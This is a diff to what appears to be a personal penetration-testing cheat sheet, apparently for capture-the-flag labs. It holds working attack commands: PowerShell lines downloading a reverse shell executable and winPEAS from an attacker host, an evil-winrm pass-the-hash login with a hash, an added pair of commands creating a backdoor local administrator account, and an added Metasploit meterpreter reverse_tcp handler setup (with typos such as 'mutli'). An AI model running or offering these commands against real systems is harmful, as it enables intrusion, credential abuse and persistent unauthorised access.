@@ -57,6 +57,9 @@ Download reverse shell from source (cmd):
 powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/rev.exe' -OutFile 'c:\Windows\Temp\rev.exe'"
 powershell -c "Invoke-WebRequest -Uri 'http://10.8.10.59:8080/winPEAS.bat' -OutFile 'c:\Windows\Temp\lin.bat'"
 
+net user NewUser MyPassword123! /add
+net localgroup Administrators /add NewUser
+
 # EVIL WinRM
 Pass the hash (bash):
 evil-winrm -i spookysec.local -u administrator -H 0e0363213e37b94221497260b0bcb4fc
@@ -265,7 +268,7 @@ enum4linux 10.10.82.233
 # SMBCLIENT
 smbclient \\\\ip\\nt4wrksv
 
-# METASPLOIT
+# METASPLOIT (metasploit, msfconsole)
 Basic msfconsole:
 search php
 use 2
@@ -274,6 +277,13 @@ set RHOSTS 1.1.1.1
 set RPORT 22
 set LHOST tun0
 set LPORT 1337
+run -j
+
+Meterpreter:
+use mutli/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORt 1337
 run -j
 
 Portscan in msfconsole:
